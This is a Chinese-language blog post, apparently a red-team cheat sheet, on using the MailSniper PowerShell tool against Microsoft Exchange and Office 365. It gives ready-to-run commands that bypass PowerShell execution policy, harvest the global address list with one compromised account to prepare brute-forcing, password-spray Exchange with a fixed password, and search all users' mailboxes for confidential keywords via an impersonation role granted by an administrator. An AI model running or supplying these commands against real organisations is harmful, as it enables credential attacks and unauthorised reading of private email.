# mailsniper.ps1


> 下载地址：https://github.com/dafthack/MailSniper.git



## mailsniper.ps1获取outlook所有联系人	

> 收集邮箱，为后续爆破准备



#### 前提

掌握其中一个用户邮箱的账户密码，并可以登录outlook





#### 利用

命令格式

```bash
# 在域内机器上执行
powershell -exec bypass
Import-Module .\MailSniper.ps1
Get-GlobalAddressList -ExchHostname outlook地址 -UserName 域名\域用户名 -Password 已知的邮箱密码 -OutFile 导出结果.txt
```



1.目标outlook搭建在自己的服务器上

```bash
ExchHostname指向自己的邮箱服务器地址即可
```



2.目标outlook在office365中

```bash
一样的道理，只不过把ExchHostname指向outlook.office365.com即可，username使用完整的邮箱，而不仅仅是用户名。

```







#### 爆破exchange（指定密码爆破邮箱）

```bash
powershell -exec bypass
Import-Module .\MailSniper.ps1
Invoke-PasswordSprayEWS -ExchHostname owa2013.rootkit.org -UserList .\users.txt -Password Admin12345 -ExchangeVersion Exchange2013_SP1

# -ExchHostname：ping -a exchange服务器ip -> 得到主机名 -> 主机名拼接域名（如：owa2013.rootkit.org）
# -ExchangeVersion：若不知道可先不指定
```







#### MailSniper检索邮件内容

Mailsniper包含两个主要的cmdlet，分别是`Invoke-SelfSearch`和`Invoke-GlobalMailSearch`，用于检索邮件中的关键字。

```bash
## 查找当前用户的Exchange邮箱数据
Invoke-SelfSearch -Mailbox zhangsan@fb.com -Terms *机密* -Folder 收件箱 -ExchangeVersion Exchange2013_SP1
# 查找邮件内容中包含pwn字符串的邮件，-Folder参数可以指定要搜索的文件夹，默认是inbox，使用时最好指定要搜索的文件夹名称（或者指定all查找所有文件），因为该工具是外国人写的，Exchange英文版收件箱为Inbox，当Exchange使用中文版时收件箱不为英文名，默认查找inbox文件夹会因找不到该文件而出错

## 查找所有用户的Exchange邮箱数据
Invoke-GlobalMailSearch -ImpersonationAccount zhangsan -ExchHostname test2k12 -AdminUserName fb.com\administrator -ExchangeVersion Exchange2013_SP1 -Term "*内部邮件*" -Folder 收件箱
# 利用administrator管理员用户为普通用户zhangsan分配ApplicationImpersonation角色，检索所有邮箱用户的邮件中，包括“内部邮件”关键字的内容
```



















































































































---

> 作者: [剑胆琴心](http://geoer.cn)  
> URL: https://shuai06.github.io/mailsniper-ps1/  

